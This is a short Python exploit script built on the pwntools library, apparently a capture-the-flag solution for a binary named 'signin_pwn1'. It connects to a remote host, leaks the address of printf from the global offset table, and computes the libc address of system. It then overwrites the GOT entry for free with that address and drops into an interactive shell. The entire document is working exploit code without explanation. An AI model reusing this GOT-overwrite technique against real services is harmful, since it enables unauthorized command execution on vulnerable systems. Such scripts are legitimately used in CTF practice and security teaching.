from pwn import *
import re
# from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
pwn3 = ELF('./signin_pwn1')
libc = ELF('./libc.so.6')
rm=1
if rm==1:
    sh = remote('10.214.160.76', 44155)
else:
    sh = process('./signin_pwn1')

# gdb.attach(sh)
shell = '/bin/sh'
sh.sendline(shell)
printf_got = pwn3.got['printf']
print('printf got', (printf_got))
sh.recvline()
sh.recv()
sh.sendline(str(printf_got).encode('utf-8'))
printf_addr_bytes = sh.recvline()[21:-1]
printf_addr = int.from_bytes(printf_addr_bytes,'little')

## get addr of system
system_offset = libc.symbols['system']
# print(system_offset)
printf_offset = libc.symbols['printf']
# print(free_offset)
system_addr = printf_addr - printf_offset + system_offset
print('system addr', (system_addr))

sh.sendline(str(pwn3.got['free']).encode('utf-8'))
sh.sendline(str(system_addr).encode('utf-8'))

sh.interactive()
